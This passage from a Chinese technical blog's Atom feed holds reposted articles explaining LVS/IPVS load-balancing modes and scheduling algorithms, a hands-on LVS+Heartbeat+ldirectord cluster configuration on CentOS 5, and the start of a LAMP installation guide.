<p><DIV><BR>十、备份与恢复 </DIV></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lvs核心ipvs]]></title>
    <link href="http://archulate.github.io/blog/2014/03/03/lvs2/"/>
    <updated>2014-03-03T00:42:34+08:00</updated>
    <id>http://archulate.github.io/blog/2014/03/03/lvs2</id>
    <content type="html"><![CDATA[<!--more-->


<p>在互连网应用技术里,<a href='http://product.it168.com/list/b/0462_1.shtml' target='_blank' class="nounderline" title='负载均衡'>负载均衡</a>一直是热门话题,本文讨论的负载均衡技术,包括但不限于负载均衡本身。使用负载均衡技术主要的目的包括如下几点：</p><p>　　◆&nbsp;系统高可用性。组成系统的某些设备或部件失效，并不会影响正常的服务。</p><p>　　◆&nbsp;系统可扩展性。用户的增加，引起访问数乃至流量的增加，这种情形下，需要对系统进行扩容，以应对这种快速增长。对于提供高可用服务的互联网网站，其对可扩展的基本要求就是在保持系统服务不终止的情况下，透明的扩充容量，即用户不知道扩容的存在，或者说是扩容不对现有的服务产生任何负面作用。这些扩展主要包括：带宽扩展、<a href='http://product.it168.com/files/0402search.shtml' target='_blank' class="nounderline" title='服务器'>服务器</a>扩展、<a href='http://storage.it168.com/' target='_blank' class="nounderline" title='存储'>存储</a>容量扩展、数据库扩展等，当然也包括主机增加<a href='http://product.it168.com/list/b/0205_1.shtml' target='_blank' class="nounderline" title='内存'>内存</a>等方面的扩展。</p><p>　　◆&nbsp;负载均衡能力。一个应用或服务由数个物理服务器提供,并且每个物理服务器运行的应用或服务是相同的,我们可以让用户的访问通过某种控制策略,把负载分摊到不同的物理服务器,从而保持每个物理服务器有比较合理的负载。当整个系统的负载趋于饱和时，通过增加物理服务器和扩充物理带宽来解决这个麻烦。增加物理服务器以后，系统的负载情况将重新在所有集群的物理服务器之间按照指定的算法重新达到新的均衡。</p><p>　　一个完整的负载均衡项目，一般由虚拟服务器、故障隔离及失败切换3个功能框架所组成。</p><p>　　虚拟服务器是负载均衡体系的基本架构，它分两层结构：转发器（Director）和真实服务器。图1为虚拟服务器的结构示意。<br />&nbsp;</p><div id="div7627917" style="text-align: center"><img id="img7627917" border="0" alt="" src="http://image4.it168.com/2009/9/21/246563e0-6bc9-4351-84ce-d907bac4b075.jpg" /></div><p>　　图1 虚拟服务器结构</p><p>　　为什么称虚拟服务器？因为从用户的角度看来，似乎只是一个服务器在提供服务。虚拟服务器最主要的功能是提供包转发和负载均衡，这个功能可以通过撰写ipvsadm脚本具体实现。虚拟服务器项目由章文嵩博士所贡献，目前已被添加到各种linux发行版的内核。</p><p>　　故障隔离指虚拟服务器中的某个真实服务器（或某几个真实服务器）失效或发生故障，系统将自动把失效的服务器从转发队列中清理出去，从而保证用户访问的正确性；另一方面，当实效的服务器被修复以后，系统再自动地把它加入转发队列。</p><p>　　失败切换，这是针对负载均衡器Director 采取的措施，在有两个负载均衡器Director的应用场景，当主负载均衡器（MASTER）失效或出现故障，备份负载均衡器（BACKUP）将自动接管主负载均衡器的工作；一旦主负载均衡器故障修复，两者将恢复到最初的角色。</p><p>　　要从技术上实现虚拟服务器、故障隔离及失败切换3个功能，需要两个工具：ipvsadm和keepalived。当然也有heartbeat这样的工具可以实现同样的功能，但相对于keepalived，heartbeat的实现要复杂得多（如撰写ipvsadm脚本，部署ldirectord，编写资源文件等）。在采用keepalived的方案里，只要ipvsadm被正确的安装，简单的配置唯一的文件keepalived就行了。</p><p>&nbsp;</p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lvs简介]]></title>
    <link href="http://archulate.github.io/blog/2014/03/03/lvs/"/>
    <updated>2014-03-03T00:38:06+08:00</updated>
    <id>http://archulate.github.io/blog/2014/03/03/lvs</id>
    <content type="html"><![CDATA[<!--more-->


<p>  <p>一、 LVS简介<br /></p>

<p>LVS是Linux Virtual Server的简称，也就是Linux虚拟服务器, 是一个由章文嵩博士发起的自由软件项目，它的官方站点是<a href="http://www.linuxvirtualserver.org/">www.linuxvirtualserver.org</a>。现在LVS已经是 Linux标准内核的一部分，在Linux2.4内核以前，使用LVS时必须要重新编译内核以支持LVS功能模块，但是从Linux2.4内核以后，已经完全内置了LVS的各个功能模块，无需给内核打任何补丁，可以直接使用LVS提供的各种功能。<br /></p>

<p>使用LVS技术要达到的目标是：通过LVS提供的负载均衡技术和Linux操作系统实现一个高性能、高可用的服务器群集，它具有良好可靠性、可扩展性和可操作性。从而以低廉的成本实现最优的服务性能。<br /></p>

<p>LVS自从1998年开始，发展到现在已经是一个比较成熟的技术项目了。可以利用LVS技术实现高可伸缩的、高可用的网络服务，例如WWW服务、Cache服务、DNS服务、FTP服务、MAIL服务、视频/音频点播服务等等，有许多比较著名网站和组织都在使用LVS架设的集群系统，例如：Linux的门户网站（<a href="http://www.linux.com/">www.linux.com</a>）、向RealPlayer提供音频视频服务而闻名的Real公司（<a href="http://www.real.com/">www.real.com</a>）、全球最大的开源网站（sourceforge.net）等。<br /></p>

<p>二、&nbsp;LVS体系结构<br /></p>

<p>使用LVS架设的服务器集群系统有三个部分组成：最前端的负载均衡层，用Load Balancer表示，中间的服务器群组层，用Server Array表示，最底端的数据共享存储层，用Shared Storage表示，在用户看来，所有的内部应用都是透明的，用户只是在使用一个虚拟服务器提供的高性能服务。<br /></p>

<p>LVS体系结构如图1所示：</p></p>

<p style="text-align: center"><a href="http://img1.51cto.com/attachment/201104/110349553.png" target="_blank"><img onload="if(this.width>650) this.width=650;&#8221; border=&#8221;0&#8221; alt=&#8221;&#8221; src=&#8221;http://img1.51cto.com/attachment/201104/110349553.png&#8221; /></a></p>




<p style="text-align: center">图1 LVS的体系结构<br />

&nbsp;</p>




<p>下面对LVS的各个组成部分进行详细介绍：<br />

&#61548;&nbsp;Load Balancer层：位于整个集群系统的最前端，有一台或者多台负载调度器（Director Server）组成，LVS模块就安装在Director Server上，而Director的主要作用类似于一个路由器，它含有完成LVS功能所设定的路由表，通过这些路由表把用户的请求分发给Server Array层的应用服务器（Real Server）上。同时，在Director Server上还要安装对Real Server服务的监控模块Ldirectord，此模块用于监测各个Real Server服务的健康状况。在Real Server不可用时把它从LVS路由表中剔除，恢复时重新加入。<br />

&#61548;&nbsp;Server Array层：由一组实际运行应用服务的机器组成，Real Server可以是WEB服务器、MAIL服务器、FTP服务器、DNS服务器、视频服务器中的一个或者多个，每个Real Server之间通过高速的LAN或分布在各地的WAN相连接。在实际的应用中，Director Server也可以同时兼任Real Server的角色。<br />

&#61548;&nbsp;Shared Storage层：是为所有Real Server提供共享存储空间和内容一致性的存储区域，在物理上，一般有磁盘阵列设备组成，为了提供内容的一致性，一般可以通过NFS网络文件系统共享数据，但是NFS在繁忙的业务系统中，性能并不是很好，此时可以采用集群文件系统，例如Red hat的GFS文件系统，oracle提供的OCFS2文件系统等。<br />

从整个LVS结构可以看出，Director Server是整个LVS的核心，目前，用于Director Server的操作系统只能是Linux和FreeBSD，linux2.6内核不用任何设置就可以支持LVS功能，而FreeBSD作为Director Server的应用还不是很多，性能也不是很好。<br />

对于Real Server，几乎可以是所有的系统平台，Linux、windows、Solaris、AIX、BSD系列都能很好的支持。</p>




<p>三、&nbsp; LVS集群的特点<br />

3.1&nbsp; IP负载均衡与负载调度算法</p>




<p>1．IP负载均衡技术<br />

负载均衡技术有很多实现方案，有基于DNS域名轮流解析的方法、有基于客户端调度访问的方法、有基于应用层系统负载的调度方法，还有基于IP地址的调度方法，在这些负载调度算法中，执行效率最高的是IP负载均衡技术。<br />

LVS的IP负载均衡技术是通过IPVS模块来实现的，IPVS是LVS集群系统的核心软件，它的主要作用是：安装在Director Server上，同时在Director Server上虚拟出一个IP地址，用户必须通过这个虚拟的IP地址访问服务。这个虚拟IP一般称为LVS的VIP，即Virtual IP。访问的请求首先经过VIP到达负载调度器，然后由负载调度器从Real Server列表中选取一个服务节点响应用户的请求。<br />

当用户的请求到达负载调度器后，调度器如何将请求发送到提供服务的Real Server节点，而Real Server节点如何返回数据给用户，是IPVS实现的重点技术，IPVS实现负载均衡机制有三种，分别是NAT、TUN和DR，详述如下： <br />

&#61548;&nbsp;VS/NAT： 即（Virtual Server via Network Address Translation）<br />

也就是网络地址翻译技术实现虚拟服务器，当用户请求到达调度器时，调度器将请求报文的目标地址（即虚拟IP地址）改写成选定的Real Server地址，同时报文的目标端口也改成选定的Real Server的相应端口，最后将报文请求发送到选定的Real Server。在服务器端得到数据后，Real Server返回数据给用户时，需要再次经过负载调度器将报文的源地址和源端口改成虚拟IP地址和相应端口，然后把数据发送给用户，完成整个负载调度过程。<br />

可以看出，在NAT方式下，用户请求和响应报文都必须经过Director Server地址重写，当用户请求越来越多时，调度器的处理能力将称为瓶颈。<br />

&#61548;&nbsp;VS/TUN ：即（Virtual Server via IP Tunneling） <br />

也就是IP隧道技术实现虚拟服务器。它的连接调度和管理与VS/NAT方式一样，只是它的报文转发方法不同，VS/TUN方式中，调度器采用IP隧道技术将用户请求转发到某个Real Server，而这个Real Server将直接响应用户的请求，不再经过前端调度器，此外，对Real Server的地域位置没有要求，可以和Director Server位于同一个网段，也可以是独立的一个网络。因此，在TUN方式中，调度器将只处理用户的报文请求，集群系统的吞吐量大大提高。<br />

&#61548;&nbsp;VS/DR： 即（Virtual Server via Direct Routing） <br />

也就是用直接路由技术实现虚拟服务器。它的连接调度和管理与VS/NAT和VS/TUN中的一样，但它的报文转发方法又有不同，VS/DR通过改写请求报文的MAC地址，将请求发送到Real Server，而Real Server将响应直接返回给客户，免去了VS/TUN中的IP隧道开销。这种方式是三种负载调度机制中性能最高最好的，但是必须要求Director Server与Real Server都有一块网卡连在同一物理网段上。</p>




<p>2．负载调度算法<br />

上面我们谈到，负载调度器是根据各个服务器的负载情况，动态地选择一台Real Server响应用户请求，那么动态选择是如何实现呢，其实也就是我们这里要说的负载调度算法，根据不同的网络服务需求和服务器配置，IPVS实现了如下八种负载调度算法，这里我们详细讲述最常用的四种调度算法，剩余的四种调度算法请参考其它资料。<br />

&#61548;&nbsp;轮叫调度（Round Robin）<br />

&ldquo;轮叫&rdquo;调度也叫1:1调度，调度器通过&ldquo;轮叫&rdquo;调度算法将外部用户请求按顺序1:1的分配到集群中的每个Real Server上，这种算法平等地对待每一台Real Server，而不管服务器上实际的负载状况和连接状态。 <br />

&#61548;&nbsp;加权轮叫调度（Weighted Round Robin） <br />

&ldquo;加权轮叫&rdquo;调度算法是根据Real Server的不同处理能力来调度访问请求。可以对每台Real Server设置不同的调度权值，对于性能相对较好的Real Server可以设置较高的权值，而对于处理能力较弱的Real Server，可以设置较低的权值，这样保证了处理能力强的服务器处理更多的访问流量。充分合理的利用了服务器资源。同时，调度器还可以自动查询Real Server的负载情况，并动态地调整其权值。 <br />

&#61548;&nbsp;最少链接调度（Least Connections） <br />

&ldquo;最少连接&rdquo;调度算法动态地将网络请求调度到已建立的链接数最少的服务器上。如果集群系统的真实服务器具有相近的系统性能，采用&ldquo;最小连接&rdquo;调度算法可以较好地均衡负载。 <br />

&#61548;&nbsp;加权最少链接调度（Weighted Least Connections） <br />

&ldquo;加权最少链接调度&rdquo;是&ldquo;最少连接调度&rdquo;的超集，每个服务节点可以用相应的权值表示其处理能力，而系统管理员可以动态的设置相应的权值，缺省权值为1，加权最小连接调度在分配新连接请求时尽可能使服务节点的已建立连接数和其权值成正比。<br />

其它四种调度算法分别为：基于局部性的最少链接（Locality-Based Least Connections）、带复制的基于局部性最少链接（Locality-Based Least Connections with Replication）、目标地址散列（Destination Hashing）和源地址散列（Source Hashing），对于这四种调度算法的含义，本文不再讲述，如果想深入了解这其余四种调度策略的话，可以登陆LVS中文站点zh.linuxvirtualserver.org，查阅更详细的信息。</p>




<p>3.2 高可用性<br />

LVS是一个基于内核级别的应用软件，因此具有很高的处理性能，用LVS构架的负载均衡集群系统具有优秀的处理能力，每个服务节点的故障不会影响整个系统的正常使用，同时又实现负载的合理均衡，使应用具有超高负荷的服务能力，可支持上百万个并发连接请求。如配置百兆网卡，采用VS/TUN或VS/DR调度技术，整个集群系统的吞吐量可高达1Gbits/s；如配置千兆网卡，则系统的最大吞吐量可接近10Gbits/s。</p>




<p>3.3 高可靠性<br />

LVS负载均衡集群软件已经在企业、学校等行业得到了很好的普及应用，国内外很多大型的、关键性的web站点也都采用了LVS集群软件，所以它的可靠性在实践中得到了很好的证实。有很多以LVS做的负载均衡系统，运行很长时间，从未做过重新启动。这些都说明了LVS的高稳定性和高可靠性。</p>




<p>3.4 适用环境<br />

LVS对前端Director Server目前仅支持Linux和FreeBSD系统，但是支持大多数的TCP和UDP协议，支持TCP协议的应用有：HTTP，HTTPS ，FTP，SMTP，，POP3，IMAP4，PROXY，LDAP，SSMTP等等。支持UDP协议的应用有：DNS，NTP，ICP，视频、音频流播放协议等。<br />

LVS对Real Server的操作系统没有任何限制，Real Server可运行在任何支持TCP/IP的操作系统上，包括Linux，各种Unix（如FreeBSD、Sun Solaris、HP Unix等），Mac/OS和Windows等。</p>




<p>3.5 开源软件 <br />

LVS集群软件是按GPL（GNU Public License）许可证发行的自由软件，因此，使用者可以得到软件的源代码，并且可以根据自己的需要进行各种修改，但是修改必须是以GPL方式发行。</p>


<p>本文出自 “<a href='http://ixdba.blog.51cto.com'>技术成就梦想</a>” 博客，请务必保留此出处<a href='http://ixdba.blog.51cto.com/2895551/552947'>http://ixdba.blog.51cto.com/2895551/552947</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[使用LVS+Heartbeat配置Linux群集]]></title>
    <link href="http://archulate.github.io/blog/2014/02/03/lvs-heartbeat/"/>
    <updated>2014-02-03T19:10:02+08:00</updated>
    <id>http://archulate.github.io/blog/2014/02/03/lvs-heartbeat</id>
    <content type="html"><![CDATA[<!--more-->


<p>【实验的基本环境】<br />

服务器系统：CentOS-5.6<br />

LVS主节点（lvs-master）：192.168.2.250(eth0) 心跳直连接口：192.168.1.250(eth1)<br />

LVS备节点（lvs-backup）：192.168.2.251(eth0) 心跳直连接口：192.168.1.251(eth1)<br />

Web Server-1：192.168.2.252<br />

Web Server-2：192.168.2.253<br />

VIP（虚拟IP）：192.168.2.254<br />

注：4台服务器已经配置好LNMP（Linux+Nginx+PHP(FastCGI模式)+MySQL）网站运行环境，当然使用Apache也可以。这里主备节点也当作真实服务器使用，所以也配置了网站环境。<br />

<br />

主备调度器eth1接口使用交叉线相连（理论上是这样）<br />

线序为： 一头为568A标准：白绿，绿；白橙，蓝；白蓝，橙；白棕，棕<br />

另一头为568B标准：白橙，橙；白绿，蓝；白蓝，绿；白棕，棕<br />

<br />

在LVS主节点和备节点的/etc/hosts中加入以下内容：<br />

#vim /etc/hosts<br />

192.168.2.250 lvs-master<br />

192.168.2.251 lvs-backup<br />

<br />

修改主机名：<br />

# vim /etc/sysconfig/network<br />

NETWORKING=yes<br />

NETWORKING_IPV6=no<br />

HOSTNAME=lvs-master<br />

GATEWAY=192.168.2.1<br />

<br />

# vim /etc/hosts<br />

# Do not remove the following line, or various programs<br />

# that require network functionality will fail.<br />

127.0.0.1 lvs-master localhost.localdomain localhost<br />

::1 localhost6.localdomain6 localhost6<br />

<br />

这2个文件都要修改，修改完后重启生效，备份机修改方法一样，不在重述。<br />

<br />

【下载软件】<br />

[libnet]<br />

wget http://search.cpan.org/CPAN/authors/id/G/GB/GBARR/libnet-1.22.tar.gz<br />

[ipvsadm]<br />

wget http://www.linuxvirtualserver.org/software/Kernel-2.6/ipvsadm-1.24.tar.gz<br />

[Heartbeat]<br />

wget http://hg.linux-ha.org/heartbeat-STABLE_3_0/archive/STABLE-3.0.4.tar.bz2<br />

[Cluster Glue]<br />

wget http://hg.linux-ha.org/glue/archive/glue-1.0.7.tar.bz2<br />

[Resource Agents]<br />

wget https://download.github.com/ClusterLabs-resource-agents-agents-1.0.4-0-gc06b6f3.tar.gz<br />

<br />

一、 配置LVS主节点（lvs-master）<br />

1. 安装libnet<br />

# tar zxvf libnet-1.1.2.2.tar.gz<br />

# cd libnet<br />

# ./configure<br />

# make &amp;&amp; make install<br />

# cd ..<br />

<br />

2. 安装ipvsadm<br />

# yum install kernel-devel //安装对应内核的kernel-devel<br />

# tar zxvf ipvsadm-1.24.tar.gz<br />

# cd ipvsadm-1.24<br />

# ln -s /usr/src/kernels/`ls /usr/src/kernels/` /usr/src/linux //将当前使用内核连接到/usr/src/linux<br />

# make &amp;&amp; make install<br />

# cd..<br />

<br />

3. 安装Heartbeat<br />

3.1 确认系统已经安装以下软件（系统光盘中有）<br />

libxslt、libxslt-devel、libgcrypt-devel、autoconf、automake、pkgconfig、 libgpg-error-devel、libtool、sgml-common、opensp、openjade、xml-common、 docbook-dtds、docbook-style<br />

如果在编译安装过程中出错，很有可能是因为缺少了相关的软件包<br />

<br />

3.2 安装glue<br />

# groupadd haclient<br />

# useradd -g haclient -M -s /sbin/nologin hacluster<br />

# tar jxvf glue-1.0.7.tar.bz2<br />

# cd Reusable-Cluster-Components-glue&#8211;glue-1.0.7/<br />

# ./autogen.sh<br />

# ./configure<br />

# make &amp;&amp; make install<br />

# cd ..<br />

<br />

3.3 安装 agents<br />

# tar zxvf ClusterLabs-resource-agents-agents-1.0.4-0-gc06b6f3.tar.gz<br />

# cd ClusterLabs-resource-agents-c06b6f3/<br />

# ./autogen.sh<br />

# ./configure<br />

# make &amp;&amp; make install<br />

# cd..<br />

<br />

3.4 安装Heartbeat<br />

# tar jxvf Heartbeat-3-0-STABLE-3.0.4.tar.bz2<br />

# cd Heartbeat-3-0-STABLE-3.0.4<br />

# ./ConfigureMe configure<br />

# gmake &amp;&amp; make install<br />

# cd..<br />

<br />

4. 配置lvs启动脚本<br />

本实验采用的是lvs-DR模式，该模式的特点是客户端的请求从主/备节点进入分配到web server，然后web server的响应是直接交付给客户端的。<br />

# vim /etc/init.d/lvs<br />

#!/bin/sh<br />

#chkconfig: 2345 20 80<br />

#description: start_lvs_of_dr<br />

VIP1=192.168.2.254<br />

RIP1=192.168.2.250<br />

RIP2=192.168.2.251<br />

RIP3=192.168.2.252<br />

RIP4=192.168.2.253<br />

./etc/rc.d/init.d/functions<br />

case &quot;$1&quot; in<br />

start)<br />

echo &quot;开启LVS DirectorServer&#8230;&quot;<br />

#设置虚拟IP地址<br />

#LVS启动时添加VIP的网口eth0:0<br />

/sbin/ifconfig eth0:0 $VIP1 broadcast $VIP1 netmask 255.255.255.255 up<br />

/sbin/route add -host $VIP1 dev eth0:0<br />

#清除IPVS表<br />

/sbin/ipvsadm -C<br />

#设置LVS<br />

/sbin/ipvsadm -A -t $VIP1:80 -s lc<br />

/sbin/ipvsadm -a -t $VIP1:80 -r $RIP1:80 -g<br />

/sbin/ipvsadm -a -t $VIP1:80 -r $RIP2:80 -g<br />

/sbin/ipvsadm -a -t $VIP1:80 -r $RIP3:80 &ndash;g<br />

/sbin/ipvsadm -a -t $VIP1:80 -r $RIP4:80 -g<br />

#使用ipvsadm来转发客户端请求。-s lc为最小连接数算法，-g是采用DR模式。有多少RIP就添加几条记录。<br />

#启动LVS<br />

/sbin/ipvsadm<br />

;;<br />

stop)<br />

echo &quot;停止LVS DirectorServer&#8230;&quot;<br />

#关闭时清除ipvsadm表<br />

/sbin/ipvsadm &ndash;C<br />

;;<br />

*)<br />

echo &quot;Usage: $0 {start|stop}&quot;<br />

exit 1<br />

esac<br />

<br />

注：这个脚本不要使用chkconfig管理，放入/etc/init.d内即可。<br />

<br />

5. 安装ldirectord相关组件<br />

默认安装完上面的三个软件包之后，ldirectord已经安装到系统中，默认路径在 /usr/etc/  ，由于ldirectord是由perl语言编写的，所以必须安装相关的软件包：Socket6、libwww-perl、URI、MailTools、 HTML-Parser<br />

# yum -y install perl-Socket6 perl-libwww-perl perl-URI perl-MailTools perl-HTML-Parser<br />

<br />

也可以在http://search.cpan.org/网站下载相关软件包安装<br />

安装方法：<br />

# perl Makefile.PL<br />

# make &amp;&amp; make install<br />

<br />

6. 配置heartbeat<br />

# cp -a /usr/etc/ha.d/ /etc/<br />

# rm -fr /usr/etc/ha.d/<br />

# ln -s /etc/ha.d/ /usr/etc/<br />

# cp /usr/share/doc/haresources /etc/ha.d/<br />

# cp /usr/share/doc/authkeys /etc/ha.d/<br />

# cp /usr/share/doc/ha.cf /etc/ha.d/<br />

# chmod 600 /etc/ha.d/authkeys //这个文件的权限必须是600<br />

<br />

6.1 修改配置文件<br />

6.1.1 authkeys文件配置（authkeys文件的作用是用来设置心跳信息的加密方式）<br />

vim /etc/ha.d/authkeys<br />

auth 1<br />

1 crc<br />

#2 sha1 HI!<br />

#3 md5 Hello!<br />

<br />

此设置是使用crc循环冗余校验，不采用加密的方式。<br />

<br />

6.1.2 ha.cf为heartbeat的主配置文件，修改下面配置。<br />

# vim /etc/ha.d/ha.cf<br />

#日志文件位置<br />

logfile /var/log/ha-log<br />

#指定主备服务器多久发送一次心跳<br />

keepalive 2<br />

#指定30秒没有收到对方心跳就认为对方已经down机<br />

deadtime 30<br />

#10秒没有收到心跳，便发出警报。<br />

warntime 10<br />

#对方DOWN后120秒重新检测一次。<br />

initdead 120<br />

#指定监听端口<br />

udpport 694<br />

#心跳监听网口，这里为eth1<br />

bcast eth1 //去掉后面#linux<br />

#备份机的心跳线接口与接口IP<br />

ucast eth1 192.168.1.251<br />

#主节点恢复后，自动收回资源。<br />

auto_failback on<br />

#指定主备服务器的主机名称，即在hosts文件中指定的。第一个node为主服务器，第二个node为备服务器。<br />

node lvs-master //服务器的主机名<br />

node lvs-backup<br />

#当192.168.2.1、192.168.2.2这两个IP都不能ping通时，对方即开始接管资源。<br />

ping_group group1 192.168.2.1 192.168.2.2<br />

#启用ipfail脚本<br />

respawn root /usr/lib/heartbeat/ipfail<br />

#指定运行ipfail的用户。<br />

apiauth ipfail gid=root uid=root<br />

<br />

6.1.3 haresources文件配置，这个文件是指定虚拟IP和改主机控制的脚本。<br />

# vim /etc/ha.d/haresources<br />

lvs-master 192.168.2.254 lvs ldirectord<br />

// master.lvs.net可为主节点主机名，192.168.2.254为虚拟IP<br />

<br />

6.1.4 ldirectord.cf是ldirectord进程的配置文件，该进程用来监视web server的运行状况，如果web server不能响应请求则把它排除在转发列表外。<br />

复制安装文件ldirectord目录上的ldirectord.cf 到/etc/ha.d/conf下，如果找不到可以查找一下：find / -name ldirectord.cf<br />

# mkdir /etc/ha.d/conf<br />

# cp ldirectord.cf /etc/ha.d/conf<br />

# vim /etc/ha.d/conf/ldirectord.cf<br />

# Global Directives<br />

#设置真实web server的超时时间<br />

checktimeout=30<br />

#监视真实web server的时间间隔<br />

checkinterval=10<br />

#如全部真实web server失败，则转发至本地<br />

fallback=127.0.0.1:80<br />

#改变配置文件内容，不需要重新ldirectord<br />

autoreload=yes<br />

#指定日志位置<br />

logfile=&quot;/var/log/ldirectord.log&quot;<br />

quiescent=no<br />

# A sample virual with a fallback that will override the gobal setting<br />

#指定虚拟IP<br />

virtual=192.168.2.254:80<br />

#指定真实web server IP及监听端口<br />

real=192.168.2.250:80 gate<br />

real=192.168.2.251:80 gate<br />

real=192.168.2.252:80 gate<br />

real=192.168.2.253:80 gate<br />

fallback=127.0.0.1:80 gate<br />

service=http<br />

#指定转发算法<br />

scheduler=lc //这里的算法要和LVS脚本的算法一样<br />

protocol=tcp<br />

#监视VIP服务器的方法<br />

checktype=negotiate<br />

checkport=80<br />

#监听测试页面名称，这个页面放入真实web server web服务的根目录<br />

request=&quot;lvs_testpage.html&quot;<br />

#指定测试页面返回内容<br />

receive=&quot;Test Page&quot;<br />

virtualhost= lvstest.net<br />

<br />

配置文件中的lvs_testpage.html必须存在网站根目录下，校验一下配置：<br />

# ldirectord -d /etc/ha.d/conf/ldirectord.cf start //按Ctrl+C结束<br />

# cp /etc/ha.d/shellfuncs /usr/lib/ocf/resource.d/heartbeat/.ocf-shellfuncs<br />

<br />

以上lvs和heartbeat配置完成。<br />

LVS备节点（lvs-backup）的配置和LVS主节点（lvs-master）完全一样。<br />

只是在/etc/ha.d/ha.cf中&ldquo;ucast eth1 192.168.1.251&rdquo;此配置地址不一样。<br />

<br />

二、配置真实web server脚本<br />

在每台web server的/etc/init.d目录下放置realserver脚本，这里主备节点同时也作为web server使用。<br />

# vim /etc/init.d/realserver<br />

#!/bin/bash<br />

# chkconfig: 2345 20 80<br />

# description: lvs_dr_realserver<br />

#指定虚拟IP<br />

VIP=192.168.2.254<br />

host=`/bin/hostname`<br />

case &quot;$1&quot; in<br />

start)<br />

# Start LVS-DR real server on this machine.<br />

/sbin/ifconfig lo down<br />

/sbin/ifconfig lo up<br />

#修改相关内核参数<br />

echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore<br />

echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announce<br />

echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore<br />

echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce<br />

/sbin/ifconfig lo:0 $VIP netmask 255.255.255.255 up<br />

/sbin/route add -host $VIP dev lo:0<br />

;;<br />

stop)<br />

# Stop LVS-DR real server loopback device(s).<br />

/sbin/ifconfig lo:0 down<br />

;;<br />

status)<br />

# Status of LVS-DR real server.<br />

islothere=`/sbin/ifconfig lo:0 | grep $VIP`<br />

isrothere=`netstat -rn | grep &quot;lo&quot; | grep $VIP`<br />

if [ ! &quot;$islothere&quot; -o ! &quot;$isrothere&quot; ];<br />

then<br />

# Either the route or the lo:0 device<br />

# not found.<br />

echo &quot;LVS-DR real server Stopped.&quot;<br />

else<br />

echo &quot;LVS-DR Running.&quot;<br />

fi<br />

;;<br />

*)<br />

# Invalid entry.<br />

echo &quot;$0: Usage: $0 {start|status|stop}&quot;<br />

exit 1<br />

;;<br />

esac<br />

<br />

# chmod +x /etc/init.d/lvs<br />

# chmod +x /etc/init.d/realserver<br />

# service heartbeat start //主备LVS调度器上执行<br />

# /etc/init.d/lvs start //主备LVS调度器上执行<br />

# /etc/init.d/realserver start //真实web服务器上执行<br />

<br />

# chkconfig &#8211;level 35 heartbeat on<br />

# echo &ldquo;/etc/init.d/lvs start&rdquo; &gt;&gt; /etc/rc.local //开机启动<br />

# echo &ldquo;/etc/init.d/realserver start&rdquo; &gt;&gt; /etc/rc.local //开机启动<br />

<br />

三、测试<br />

配置已经测试过了，但是不同系统环境可能会出一些意料之外的事情。</p>




<div align="right">【责任编辑：<a class="ln" href="mailto:yangsai@51cto.com">枯木</a> TEL：（010）68476606】</div>




<p></p>


<br> 


<p class="blank10"></p>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linux+Apache+Mysql+PHP典型配置]]></title>
    <link href="http://archulate.github.io/blog/2014/01/09/lamp/"/>
    <updated>2014-01-09T18:28:42+08:00</updated>
    <id>http://archulate.github.io/blog/2014/01/09/lamp</id>
    <content type="html"><![CDATA[<!--more-->


<p>原文地址：<a href="http://www.5ilinux.com/lamp01.html">http://www.5ilinux.com/lamp01.html</a></p>

<br>


<br>


<br>Linux+Apache+Mysql+PHP典型配置&nbsp;


<br>


<br>调试环境：Redhat9.0&nbsp;Apache1.3.29&nbsp;Mysql3.23.58&nbsp;PHP4.3.4


<br>


<br>Linux系统的安装我就不讲了，这是基本功，其实这篇文章在类似Redhat的其他linux也应该通用，大家只要掌握我提供的方法就行。记得安装Redhat9。0的时候不要安装系统默认的apache，mysql和php以及相关的软件。已经安装的请用rpm&nbsp;-e&nbsp;*&nbsp;删除已经安装的包。


<br>


<br>1.安装Mysql3.23.58


<br>


<br>其实老实说直接安装Mysql官方网站提供的rpm包也是一个比较可行的办法，他的官方网站的rpm包的提供基本跟tar包发行是同步的，这点我比较喜欢，至少安装rpm包的在后面的调试中不会出现mysql库文件找不到的情况。但这里还是有必要讲一下自定义安装的步骤，毕竟网友自定义安装的还说挺多的。


<br>


<br>软件获取：http://www.mysql.com/downloads/index.html


<br>


<br>安装步骤：


<br>


<br>tar&nbsp;zxvf&nbsp;mysql-3.23.58.tar.gz&nbsp;


<br>cd&nbsp;mysql-3.23.58


<br>


<br>./configure&nbsp;&#8211;prefix=/usr/local/mysql&nbsp;&#8211;sysconfdir=/etc&nbsp;&#8211;localstatedir=/var/lib/mysql


<br>


<br>make


<br>


<br>make&nbsp;install


<br>


<br>#prefix=/usr/local/mysql&nbsp;mysql安装的目标目录


<br>


<br>#sysconfdir=/etc&nbsp;my.ini配置文件的路径


<br>


<br>#localstatedir=/var/lib/mysql&nbsp;数据库存放的路径


<br>


<br>安装完以后要初始化数据库，当然你是升级的话不用做这步；


<br>


<br>/usr/local/mysql/bin/mysql_install_db


<br>


<br>


<br>如果系统没有mysql这个用户的话，最好做以下这步：


<br>


<br>useradd&nbsp;-M&nbsp;-o&nbsp;-r&nbsp;-d&nbsp;/var/lib/mysql&nbsp;-s&nbsp;/bin/bash&nbsp;-c&nbsp;&#8220;MySQL&nbsp;Server&#8221;&nbsp;-u&nbsp;27&nbsp;mysql&nbsp;


<br>


<br>然后我启动mysql


<br>


<br>/usr/local/mysql/bin/safe_mysqld&nbsp;&amp;


<br>


<br>ok，先看看mysql能否正常工作


<br>


<br>mysql&nbsp;-uroot&nbsp;mysql


<br>


<br>一般情况下都是不能正常链接数据库，错误提示一般为：


<br>


<br>ERROR&nbsp;2002:&nbsp;Can&#8217;t&nbsp;connect&nbsp;to&nbsp;local&nbsp;MySQL&nbsp;server&nbsp;through&nbsp;socket&nbsp;&#8217;/var/lib/mysql/mysql.sock&#8217;&nbsp;(2)&nbsp;


<br>


<br>其实网上大家问的最多的都是整个问题，说什么链接不到mysqld.sock，其实大家不妨看看mysql的错误日志就明白怎么回事，我这里的错误日志是在


<br>


